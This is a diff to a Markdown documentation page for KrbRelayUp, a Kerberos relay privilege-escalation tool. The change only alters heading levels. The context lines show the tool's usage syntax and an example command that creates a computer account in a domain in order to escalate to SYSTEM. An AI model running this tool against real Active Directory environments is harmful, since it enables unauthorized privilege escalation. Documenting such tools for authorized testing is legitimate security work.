@@ -11,19 +11,19 @@ weight : 0
 
 ## KrbRelayUp
 
-### Installation
+## Installation
 
 Build the binary from [source](https://github.com/Dec0ne/KrbRelayUp) or use the pre-compiled binary below.
 
 {{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(exe)"/%}}
 
-### Usage
+## Usage
 
 ```plain
 KrbRelayUp.exe relay -d FQDN -cn COMPUTER [-c] [-cp PASSWORD | -ch NTHASH]
 ```
 
-### Flags
+## Flags
 
 ```plain
 KrbRelayUp - Relaying you to SYSTEM
@@ -84,7 +84,7 @@ General Options:
     -v  (--Verbose)                  Show verbose output. (Optional)
 ```
 
-### Examples
+## Examples
 
 ```plain
 PS C:\Users\johndo\Desktop> .\KrbRelayUp.exe relay -Domain offsec.nl -CreateNewComputerAccount -ComputerName receptie-pc$ -ComputerPassword Welkom1234
@@ -133,6 +133,6 @@ KrbRelayUp - Relaying you to SYSTEM
 
 ![Example](images/example.png)
 
-### URL list
+## URL List
 
 * [Github.com - KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
